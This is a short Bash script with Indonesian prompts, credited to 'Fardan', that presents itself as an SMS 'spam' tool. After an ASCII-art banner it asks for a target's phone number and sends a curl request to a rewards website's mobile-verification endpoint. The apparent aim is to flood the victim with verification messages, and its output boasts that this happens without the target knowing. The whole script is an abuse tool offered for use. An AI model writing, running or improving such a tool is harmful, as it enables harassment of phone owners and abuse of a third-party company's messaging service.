
#!/bin/bash

clear

figlet spam | lolcat
echo "
╔════•ೋೋ•════╗
buat = Fardan
╚════•ೋೋ•════╝
           " | lolcat
echo "
─────█─▄▀█──█▀▄─█──
────▐▌──────────▐▌──
────█▌▀▄──▄▄──▄▀▐█──
───▐██──▀▀──▀▀──██▌──
──▄████▄──▐▌──▄████▄─
echo       "   | lolcat
echo [1].spam
echo [2].Exit
echo
read -p "masukan pilihan anda : " pil
if [[ $pil = 1 ]]; then
read -p "masukan no target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
echo "target sudah terkena spam"
echo "Tanpa di ketahui"
echo "jika tidak bisa ulang lagi selmat mencoba. . . "
echo "jangan slah gunakan"
echo "selesai"
else
echo "Terimakasih"
exit
fi